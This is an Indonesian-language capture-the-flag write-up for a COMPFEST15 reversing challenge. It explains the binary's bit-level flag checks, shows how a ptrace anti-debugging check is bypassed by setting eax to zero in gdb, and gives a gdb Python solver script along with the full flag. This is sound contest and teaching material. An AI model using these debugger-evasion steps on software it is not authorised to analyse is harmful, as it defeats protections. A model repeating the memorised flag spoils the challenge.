<figure><img src="https://lh7-us.googleusercontent.com/31tTCW13Xk5MRZ4dVfxkthaWLaK1NS1H_O9uMqohZ0JCbkftUwvtcQW1R9v0lcsym7_gt_dylLgEGrDTOUERyQzNpfOaw-EeLCKt8whd4_cxO7d_EwK9yKcK35LldjI5kaXRHUMU4wnK2zs65nuPAT8" alt=""><figcaption></figcaption></figure>

Fungsi terakhir yang dipanggil akan seperti gambar diatas. Step out dua kali dan cek pada assembly, maka akan ada dua perbandingan yaitu nilai r14 dan r15 yang didapat dari lzcnt dan tzcnt. Jadi intinya lzcnt dan tzcnt menghitung null bytes pada lsb dan msb

```
tzcnt
0000000100000000 -> 8
0000000010101000 -> 3


lzcnt
0000000010101000 -> 8
0000000111111111 -> 7
```

Sedangkan bextr melakukan extraksi bit r9d dengan ketentuan r10d.

```
r10d = 0000011000000000 -> 00000110 00000000
start = 00000000 
length = 00000110
r9d = 0x6261 -> 0b110001001100001


6 bit from index 0


result = 100001 
```

Karena terdapat bextr untuk 1 bit dan nilainya pasti, maka kita bisa reverse validasi flag dengan hanya memanfaatkan bextr 0x10\* saja. Pada proses pengerjaan, kami mendapat 2 kali fake flag sebelum akhirnya dapat flag asli. Untuk mendapatkan flag asli pertama kita perlu mengetahui dimana perubahan pada program

<figure><img src="https://lh7-us.googleusercontent.com/hR9w0tta_hSbmKHVM9DPEhpLwz66n2dNhTz4TwCPyagnN9gKaiWe5ZjBG6-pqMG52wZF5dmX8tUHQalQf8HMxa1xvVhKbZzxazK34KFniGZs3iY4BxsXxi7WkSfOZMZSCshoLsiNzPLG_VVnGEV4UFY" alt=""><figcaption></figcaption></figure>

Pada address 0x023C89A terdapat cross reference dari sub\_23CCD5. Fungsi tersebut memiliki cross reference dari .init\_array yang mana artinya dipanggil sebelum main.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/vJHv7DbEst0m7xAWHkE7kM_6TlF9j-29DJPzFv0djeh2c2geJO_GOLvMz6llOURytk0hGyn2BBp1k8yvh7kmWiT-pRYMGRsFKCqJ_MzRJyliYolbjvu8rlDEmuxl0CB1J9BWKCIFyHchSFdYhf0QeXo" alt=""><figcaption></figcaption></figure>

Pada salah satu instruksi terdapat pemanggilan fungsi yang nilai addressnya disimpan pada register. Selanjutnya lakukan breakpoint dan debug pada address tersebut.

<figure><img src="https://lh7-us.googleusercontent.com/zdkR8h6vGgwXMhAYJU4fcQ13jE99YUM4shzzuLNIJoHUkSvE0Jz_V6pmFRjR4aJ68ZQ_5xF7LjpUvMxjf4M5nrLhxi16GpkVsDEmWUlpMOxbvu9EWq6GBM3KHvx7y5dCsUEsPqCaZZOPC5C-pCXq5Lw" alt=""><figcaption></figcaption></figure>

Fungsi tersebut ternyata melakukan pemanggilan syscall dengan rax = 0x65 yang mana itu merupakan nilai untuk ptrace

<figure><img src="https://lh7-us.googleusercontent.com/TrB2hSAlwzTYnqgjFqJO8Fr4xXrew-Aa-epoAoiMhbyDMr9RIb5qV3nklScSdApOfi9gFpvUWpbZRr2__uvB6llHQXSZwjsraW1-cPaktkarKli7IUVMTnr-LHDMnb06I-AQyCq0EPjiFQq8RAEMXZk" alt=""><figcaption></figcaption></figure>

Jadi pemanggilan fungsi tersebut tujuannya adalah untuk melakukan pengecekan terhadap debugging/anti debugging dan pada langkah tersebutlah dilakukan perubahan flow/pemanggilan fungsi yang seharusnya. Jadi langkah yang kami lakukan adalah melakukan perubahan terhadap nilai eax yang dibandingkan menjadi 0 lalu melakukan reverse terhadap validasi flag (dengan appropch yang disampaikan sebelumnya, bextr dengan r10d == 0x10\*) untuk mendapatkan flagnya. Untuk sampai ke instruksi validasi dengan hasil extract bit 0x10\* dilakukan step in secara terus menerus sampai ketemu instruksi tersebut. Berikut solver yang kami gunakan

```python
#!/usr/bin/python3
import string
from itertools import product
from Crypto.Util.number import *

class SolverEquation(gdb.Command):
    def __init__ (self):
        super (SolverEquation, self).__init__ ("solve-equation",gdb.COMMAND_OBSCURE)
    
    def get_flag(self, f):
        f = f.split('\n')
        counter = 0
        bin_val = ''
        for i in range(len(f)):
            if('or     r11,0x0' in f[i]):
                if(counter == 0):
                    if('r14,0xf' in f[i-2]):
                        bin_val += '1'
                    else:
                        bin_val += '0'
                    counter += 1
                    if(len(bin_val) == 16):
                        return long_to_bytes(int(bin_val[::-1],2))[::-1] 
                        bin_val = ''
                else:
                    counter = 0

    def invoke (self, arg, from_tty):
        gdb.execute("pie del")
        bp = [0x000000000023C89A,0x000000000023C8AA,0x000000000023C8BA,0x000000000023C8CA,0x000000000023C8DA,0x000000000023C8EA,0x000000000023C8FA,0x000000000023C90A,0x000000000023C91A,0x000000000023C92A,0x000000000023C93A,0x000000000023C94A,0x000000000023C95A,0x000000000023C96A,0x000000000023C97A,0x000000000023C98A,0x000000000023C99A,0x000000000023C9AA,0x000000000023C9BA,0x000000000023C9CA,0x000000000023C9DA,0x000000000023C9EA,0x000000000023C9FA,0x000000000023CA0A,0x000000000023CA1A,0x000000000023CA2A,0x000000000023CA3A,0x000000000023CA4A,0x000000000023CA5A,0x000000000023CA6A,0x000000000023CA7A,0x000000000023CA8A,0x000000000023CA9A,0x000000000023CAAA,0x000000000023CABA,0x000000000023CACA,0x000000000023CADA,0x000000000023CAEA,0x000000000023CAFA,0x000000000023CB0A,0x000000000023CB1A,0x000000000023CB2A,0x000000000023CB3A,0x000000000023CB4A,0x000000000023CB5A,0x000000000023CB6A,0x000000000023CB7A,0x000000000023CB8A,0x000000000023CB9A,0x000000000023CBAA,0x000000000023CBBA,0x000000000023CBCA,0x000000000023CBDA,0x000000000023CBEA,0x000000000023CBFA,0x000000000023CC0A,0x000000000023CC1A,0x000000000023CC2A,0x000000000023CC3A,0x000000000023CC4A,0x000000000023CC5A,0x000000000023CC6A,0x000000000023CC7A,0x000000000023CC8A,0x000000000023CC9A,0x000000000023CCAA,0x000000000023CCBA,0x000000000023CCCA]
        for i in range(len(bp)):
            gdb.execute(f"pie b {bp[i]}")
        gdb.execute("pie b 0x23da2c")
        gdb.execute("pie run < inp.txt")
        gdb.execute("set $eax=0x0")
        gdb.execute("c")
        flag = b""
        arch = gdb.selected_frame().architecture()
        for _ in range(len(bp)):
            for i in range(0xff):
                gdb.execute("si")
                current_pc = addr2num(gdb.selected_frame().read_register("pc"))
                disa = arch.disassemble(current_pc)[0]
                if(disa['asm'] == 'mov    r10,0x100'):
                    tmp = gdb.execute("x/2820i $pc", to_string=True)
                    flag += self.get_flag(tmp)
                    print(b"flag:" + flag)
                    gdb.execute("c")
                    break
        print(flag)
        
def addr2num(addr):
    try:
        return int(addr)  # Python 3
    except:
        return long(addr) # Python 2
SolverEquation()

```

<figure><img src="https://lh7-us.googleusercontent.com/kDZHkLh9AoIDgKHNLD_2cvSkydTcI-JaQN40tMz-KDCKMgIrsH2YrWEVkKOorfizoTPY9faclWin7_iywyqKuTNdEsG_0c3zxI9TpqEl3lP5wLWusLiNOheOPubt2HuKn76m54c-F4NQyGMTEf9WuAU" alt=""><figcaption></figcaption></figure>

Flag : COMPFEST15{sup3r\_l0ng\_fL46\_5o\_7hAT\_YOu\_w0nT\_Be\_a3le\_t0\_s0LvE\_1t\_m4nuALLy\_w3ll\_tecHnicaLly\_u\_c4n\_bU7\_s1mpL3\_gdb\_scRipt1n9\_1s\_aLL\_You\_n33D\_a95dff5469}
